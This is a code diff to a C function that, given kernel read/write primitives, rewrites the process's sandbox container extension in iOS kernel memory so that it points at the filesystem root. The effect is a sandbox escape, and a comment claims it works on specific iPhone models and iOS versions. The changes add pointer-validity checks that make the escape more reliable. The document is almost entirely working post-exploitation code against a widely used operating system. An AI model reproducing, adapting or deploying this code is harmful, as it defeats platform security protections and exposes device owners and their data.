@@ -24,33 +24,55 @@
 // This is almost same behavior with sandbox_extension_consume with r/w on root
 // Confirmed works on iPhone 14 Pro/17.2.1, iPhone SE3/26.0
 int patch_sandbox_ext(void) {
-    uint64_t label = proc_get_cred_label(proc_self());
+    uint64_t self_proc = proc_self();
+    if (!self_proc || !is_kaddr_valid(self_proc)) {
+        printf("patch_sandbox_ext: invalid self proc=0x%llx\n", self_proc);
+        return -1;
+    }
+    uint64_t label = proc_get_cred_label(self_proc);
+    if (!label || !is_kaddr_valid(label)) {
+        printf("patch_sandbox_ext: invalid self label=0x%llx\n", label);
+        return -1;
+    }
     uint64_t sbx = label_get_sandbox(label);
+    if (!sbx || !is_kaddr_valid(sbx)) {
+        printf("patch_sandbox_ext: invalid self sandbox=0x%llx\n", sbx);
+        return -1;
+    }
     struct sandbox_label sbx_lbl = {0};
     kreadbuf(sbx, &sbx_lbl, sizeof(struct sandbox_label));
     uint64_t ext_set_kptr = (uint64_t)sbx_lbl.extension_set;
+    if (!ext_set_kptr || !is_kaddr_valid(ext_set_kptr)) {
+        printf("patch_sandbox_ext: invalid extension set=0x%llx\n",
+               ext_set_kptr);
+        return -1;
+    }
     
     struct extension_set ext_set = {0};
     kreadbuf(ext_set_kptr, &ext_set, sizeof(struct extension_set));
     for(int i = 0; i < 9; i++) {
         uint64_t ext_class_node_kptr = (uint64_t)ext_set.type_buckets[i];
         if(ext_class_node_kptr != 0) {
+            if (!is_kaddr_valid(ext_class_node_kptr)) continue;
             struct extension_class_node ext_class_node = {0};
             kreadbuf(ext_class_node_kptr, &ext_class_node, sizeof(ext_class_node));
+            uint64_t class_name_kptr = (uint64_t)ext_class_node.class_name;
+            if (!class_name_kptr || !is_kaddr_valid(class_name_kptr)) continue;
             
             char name[256] = {0};
-            kreadbuf((uint64_t)ext_class_node.class_name, name, 256-1);
+            kreadbuf(class_name_kptr, name, 256-1);
             
             if (strstr(name, "com.apple.sandbox.container") == NULL) {
                 continue;
             }
             
             uint64_t ext_kptr = (uint64_t)ext_class_node.ext_list_head;
-            if (!ext_kptr) continue;
+            if (!ext_kptr || !is_kaddr_valid(ext_kptr)) continue;
             
             struct extension ext = {0};
             kreadbuf(ext_kptr, &ext, sizeof(ext));
             uint64_t path_buf = (uint64_t)ext.data_ptr;
+            if (!path_buf || !is_kaddr_valid(path_buf)) continue;
             
             uint8_t root_path[] = { '/', '\0' };
             kwritebuf(path_buf, root_path, 2);
@@ -68,7 +90,7 @@ int patch_sandbox_ext(void) {
             kwrite8(ext_kptr + offsetof(struct extension, file.storage_class), SC_ISSUED);
             
             struct stat st;
-            stat("/", &st);
+            if (stat("/", &st) != 0) return -1;
             kwrite32(ext_kptr + offsetof(struct extension, file.st_dev), (uint32_t)st.st_dev);
             kwrite64(ext_kptr + offsetof(struct extension, st_ino), (uint64_t)st.st_ino);
             
